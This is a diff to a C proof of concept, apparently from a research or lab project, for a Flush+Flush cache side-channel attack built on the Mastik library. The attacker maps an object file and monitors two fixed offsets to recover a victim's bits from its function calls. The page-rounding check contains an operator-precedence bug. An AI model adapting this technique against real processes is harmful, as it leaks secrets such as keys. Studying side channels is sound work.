@@ -4,41 +4,29 @@
 #include <string.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <sys/mman.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <mastik/symbol.h>
 #include <mastik/ff.h>
 #include <mastik/util.h>
 
+#include "../tests/dummy.h"
+
 #define SAMPLES 10000
 #define SLOT 900
 #define THRESHOLD 500
 
-void dummy1()
-{
-    int i = 1;
-    i += 1;
-}
-
-void dummy2()
-{
-    int j = 2;
-    j += 2;
-}
-
 void victim(unsigned char *binData, size_t binSize)
 {
-    // void (*dummy_ptr)() = dummy;
-    // printf("%lu\n", (uint64_t) dummy_ptr);
-
     for (size_t i = 0; i < binSize; i++)
     {
         for (int j = 7; j >= 0; j--)
         {
-            dummy1();
+            dummy_light1();
             if (binData[i] & (1 << j))
             {
-                dummy2();
+                dummy_light2();
             }
         }
     }
@@ -46,17 +34,29 @@ void victim(unsigned char *binData, size_t binSize)
 
 void attacker()
 {
-    void (*dummy1_ptr)() = dummy1;
-    void (*dummy2_ptr)() = dummy2;
-    // printf("%lu\n", (uint64_t) dummy_ptr);
+    int fd = open("../tests/dummy.o", O_RDONLY);
+    size_t size = lseek(fd, 0, SEEK_END);
+    if (size == 0)
+        exit(-1);
+    size_t map_size = size;
+    if (map_size & 0xFFF != 0) // check if size > 0xFFF
+    {
+        map_size |= 0xFFF;
+        map_size += 1;
+    }
+
+    size_t base = (size_t) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
+
+    size_t offset1 = 0x1ab0;
+    size_t offset2 = 0x1b1f;
 
     ff_t ff = ff_prepare();
     int n_monitor = 2;
-    ff_monitor(ff, dummy1_ptr);
-    ff_monitor(ff, dummy2_ptr);
+    ff_monitor(ff, (void*)(base+offset1));
+    ff_monitor(ff, (void*)(base+offset2));
 
     uint16_t *res = malloc(SAMPLES * n_monitor * sizeof(uint16_t));
-    for (int i = 0; i < SAMPLES*n_monitor; i += 4096 / sizeof(uint16_t))
+    for (int i = 0; i < SAMPLES * n_monitor; i += 4096 / sizeof(uint16_t))
         res[i] = 1;
     ff_probe(ff, res);
 
